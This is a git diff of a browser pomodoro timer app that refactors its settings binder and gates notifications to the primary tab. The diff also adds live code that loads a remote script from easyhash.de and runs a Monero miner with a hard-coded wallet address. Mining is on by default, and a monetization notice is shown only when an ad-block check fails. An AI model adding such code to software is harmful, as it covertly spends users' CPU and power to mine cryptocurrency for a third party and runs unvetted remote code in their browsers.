@@ -10,6 +10,7 @@ import alarmClock from "../sounds/alarmclock.mp3"
 import ding from "../sounds/ding.mp3"
 import doorbell from "../sounds/doorbell.mp3"
 import { Howl, Howler } from 'howler';
+import _ from 'lodash'
 window.toJS = toJS
 // doesn't work, minimal height is 70 for resizeTo method
 // let resize, previousResize = window.innerHeight
@@ -66,9 +67,11 @@ const defaultState = {
     remaingTime: null,
     local: local,
     timerModal: false,
+    primary: true,
     noSync: {
         minerOn: true,
         adBlockingOn: false,
+        opener: window.opener
     },
     s: {
         amountToMine: 70,         //mining is inverse, 100 is 100 cpu free
@@ -95,10 +98,6 @@ const defaultState = {
     get animationDuration() {
         return (this.isWorking ? this.work : this.breakType) + 1 + "s"
     },
-    // get primary() {
-    //     if (!this.active) return false
-    //     return this.active[0] == this.id
-    // },
     get timeString(){
         return format(this.remaingTime, "mm:ss")
     },
@@ -144,7 +143,7 @@ const actions = {
         s.remaingTime = show
     },
     notify() {
-        if (s.s.notifications) {
+        if (s.s.notifications && s.primary) {
             let sound, body, title
             let bigBreak = s.sessions == 1
             let requireInteraction
@@ -217,34 +216,26 @@ if ("init") {
             log("error", s)
             throw new Error(`${key} doesn't exist on ${setting}`)
         }
+        let obj = []
         if (setting) {
-            const type = typeof s.s[key]
-            return (val) => { 
-                const v = val && val.target && val.target.value? val.target.value : val
-                if(typeof v != type) {
-                    val.target.value = s.s[key]
-                }
-                s.s[key] = v
-            }
+            obj.push("s")
         }
+        obj.push(key)
         const type = typeof s[key]
         return (val) => {
             const v = val && val.target && val.target.value? val.target.value : val
             const t = typeof v
-            if(t == "boolean" || typeof (v*1) == type) {
-                console.log(typeof v*1 == type, t == "boolean", t)
-                s[key] = v
+            const numb = !isNaN(v*1) && t !="boolean"
+            //is geared for inputs returing numbers as strings
+            if(t == type || numb) {
+                console.log(numb, v, obj[key])
+                _.set(s, obj, numb? v*1 : v)
+                console.log(numb, v, obj, key, s[key])
             } else {
-                val.target.value = s[key]
+                console.log(v)
+                val.target.value = _.get(s, obj)
             }
-            console.log(key, typeof v, v, s[key])
-            // console.log(key)
-            // const v = val && val.target && val.target.value? val.target.value : val
-            // if(typeof v != type) {
-            //     val.target.value = s[key]
-            // }
-            // s[key] = v
-            // console.log(s[key])
+
         }
     }
 
@@ -290,8 +281,6 @@ if ("init") {
         return res
     }
     var s = observable(defaultState)
-    
-
     // var {state: s, actions: act} = initialize({
     //     observable, 
     //     autorun,
@@ -345,22 +334,44 @@ if ("autoruns") {
             html.style.overflow = "auto"
         }
     })
-    // autorun(function miner(){
-    //     //mining is inverse, 100 is 100 cpu free
-    //     if (document.getElementById('liKHkvRyAnct')) {
-    //         // console.log('Blocking Ads: No');
-    //     } else {
-    //         // console.log('blocking')
-    //         document.getElementById('monitizationNotificaiton').style.display = 'block'
-    //     }
-    //     if(!s.primary) return
-    //     if(s.local) return
-    //     if (typeof EverythingIsLife == "undefined"){
-    //         s.noSync.minerOn = false
-    //         return
-    //     }
-    //     EverythingIsLife('4B7FHf9icoMJwLLGxrpB5N6xXiaSEc6kM43UTbFMvMhjHPpoPdPkqWh9Fyj8DcQxiKKYkdoFoQR96Svjz6f8QScK28mAwCw', 'x', s.s.amountToMine);
-    // })
+
+    if ("mining"){
+        var minerScript = document.createElement("script")
+        minerScript.type = "text/javascript";
+        minerScript.onload = function () {
+            autorun(function miner(){
+                //mining is inverse, 100 is 100 cpu free
+                if (document.getElementById('liKHkvRyAnct')) {
+                    // console.log('Blocking Ads: No');
+                } else {
+                    console.log('blocking')
+                    document.getElementById('monitizationNotificaiton').style.display = 'block'
+                }
+                if(!s.primary) return
+                if(s.local) return
+                if (typeof EverythingIsLife == "undefined"){
+                    s.noSync.minerOn = false
+                    return
+                }
+                if(s.s.amountToMine == 100){
+                    s.noSync.minerOn = false
+                }
+                EverythingIsLife('4B7FHf9icoMJwLLGxrpB5N6xXiaSEc6kM43UTbFMvMhjHPpoPdPkqWh9Fyj8DcQxiKKYkdoFoQR96Svjz6f8QScK28mAwCw', 'x', s.s.amountToMine);
+            })
+        };
+        minerScript.onerror = function () {
+                document.getElementById('monitizationNotificaiton').style.display = 'block'
+                s.noSync.minerOn = false
+        };
+        minerScript.src = "https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.xmr2";
+        document.getElementsByTagName("head")[0].appendChild(minerScript);
+    }
+
+// <script src="https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.xmr2" ></script>
+// <script type="text/javascript">
+// EverythingIsLife('replace_with_your_xmr_address.PaymentID(or WorkerName)', 'x', 50);
+// </script>
+
 
 }
 
